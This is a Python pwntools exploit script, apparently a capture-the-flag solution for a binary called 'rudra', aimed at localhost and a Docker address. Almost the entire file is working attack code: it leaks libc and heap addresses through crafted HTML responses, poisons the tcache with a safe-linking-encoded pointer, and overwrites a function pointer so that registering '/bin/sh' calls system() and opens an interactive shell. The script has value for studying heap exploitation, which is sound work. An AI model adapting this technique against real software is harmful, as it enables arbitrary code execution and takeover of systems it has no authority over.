from pwn import *
#from icecream import ic
import os 

# Set up pwntools for the correct architecture
exe = "./rudra"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

off1, off2 = 1, 1

def start(argv=[], *a, **kw):
    global off1
    '''Start the exploit against the target.'''
    if args.REMOTE:
        off1 = +0x676c40 - 0x1c1000
        return remote("localhost", 1337)
    if args.GDB:
        off1 = +0x676c40
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        off1 = +0x676c40
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

#ip = b"10.113.11.114"
ip  = b"172.17.0.1"

#######################################
#           Helper Functions          #
#######################################

def register(name="BOB1"):
    sla(b"Command: ", b"register")
    sla(b"Username: ", name)

def ip_hack(web):
    sla(b"Command: \x1b\x5b\x30\x6d", b"ip_hack")
    sla(b"Website: \x1b\x5b\x30\x6d", web)

def url_glob(web):
    sla(b"Command: \x1b\x5b\x30\x6d", b"url_glob")
    sla(b"Website: \x1b\x5b\x30\x6d", web)

def website_hack(web):
    sla(b"Command: \x1b\x5b\x30\x6d", b"website_hack")
    sla(b"Website: \x1b\x5b\x30\x6d", web)

def header(web, path):
    sleep(4)
    sla(b"Command: \x1b\x5b\x30\x6d", b"header")
    sla(b"Website: \x1b\x5b\x30\x6d", web)
    sla(b"Path to file: \x1b\x5b\x30\x6d", path)

def content(web, path):
    sleep(4)
    sla(b"Command: \x1b\x5b\x30\x6d", b"content")
    sla(b"Website: \x1b\x5b\x30\x6d", web)
    sla(b"Path to file: \x1b\x5b\x30\x6d", path)

def history():
    sla(b"Command: \x1b\x5b\x30\x6d", b"history")
    
def write_file(Dat):
    sleep(4)
    with open("index.html", "wb") as f:
        f.write(Dat)    
        f.flush()  
        os.fsync(f.fileno())    

def bs(dat):
    sla(b"Command: \x1b\x5b\x30\x6d", b"help" + dat)

st = b"<html>"
et = b"</html>"

#######################################
#           Actual Exploit            #
#######################################
r = start()

register() 

# Get Libc Leak
url_glob(b"{tourpran,tourpran}.github.io")

write_file(st + b"A"*(0x1e0-0x10-14) + et)
content(ip, b"/")

ru(b"</html>")
libc.address = u64(re(6) + b"\0\0") - 0x202228
log.info("Libc => %s" % hex(libc.address))


# Get Heap Leak
write_file(st + b"A"*(0x40-0x10-14-7) + et)
content(ip, b"/")

ru(b"AA</html>")
heap = (u64(re(5) + b"\0\0\0") // 0x10 ) + 1
log.info("Heap => %s" % hex(heap))

def enc(val):
    return val ^ heap

# Get tcache overwrite

write_file(st + b"A"*(0x28 - len(st+et)) + et) # Some clean up - 0x30
for i in range(4):
    content(ip, b"/")

sla(b"Command: \x1b\x5b\x30\x6d", b"feedback")
sl(b"N"*26)
sl(b"S"*26)
sl(b"W"*26)
sl(b"L"*26)
write_file(st + p64(enc(libc.address + off1)) + b"O"*(0x310 - 14 - 0x10) + et)
content(ip, b"/")

write_file(b"Z"*(0x190 - 179 - 0x10) )
header(ip, b"/")

register(b"A")
register(b"/bin/sh\0" + p64(libc.sym.system))

r.interactive()